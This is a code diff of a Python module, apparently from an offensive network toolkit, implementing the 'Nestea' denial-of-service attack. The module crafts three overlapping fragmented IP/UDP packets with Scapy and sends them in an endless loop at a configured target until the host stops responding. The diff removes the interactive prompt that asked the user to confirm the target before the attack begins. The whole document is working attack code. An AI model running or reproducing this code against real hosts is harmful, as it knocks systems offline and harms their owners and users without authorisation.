@@ -11,23 +11,19 @@ class nestea_dos(DoS):
     """
     def __init__(self):
         super(nestea_dos, self).__init__('Nestea DoS')
+        conf.verb = 0
+        self.info = """
+                    Linux-equivalent to the teardrop attack, this sends 
+                    fragmented datagram packets with overlapping payloads."""
 
     def initialize(self):
-        # shut scapy up
-        conf.verb = 0
-
+        target = self.config['target']['value']
         try:
-            self.get_ip()
-            tmp = raw_input('[!] Nestea DoS IP %s.  Is this correct? '
-                                 % self.target)
-            if 'n' in tmp.lower():
-                return
-
-            pkt1 = IP(dst=self.target, id=42, flags="MF") / UDP() / ("X" * 10)
-            pkt2 = IP(dst=self.target, id=42, frag=48) / ("X" * 116)
-            pkt3 = IP(dst=self.target, id=42, flags="MF") / UDP() / ("X" * 224)
+            pkt1 = IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 10)
+            pkt2 = IP(dst=target, id=42, frag=48) / ("X" * 116)
+            pkt3 = IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 224)
             while True:
-                util.Msg('DoSing %s...' % self.target)
+                util.Msg('DoSing %s...' % target)
                 send(pkt1)
                 send(pkt2)
                 send(pkt3)
@@ -35,7 +31,7 @@ class nestea_dos(DoS):
                 if self.is_alive():
                     util.Msg('Host appears to still be up.')
                     try:
-                        tmp = raw_input('[!] Try again? ')
+                        tmp = raw_input('[!] Try again? [Y/n] ')
                     except Exception:
                         break
                     if 'n' in tmp.lower():
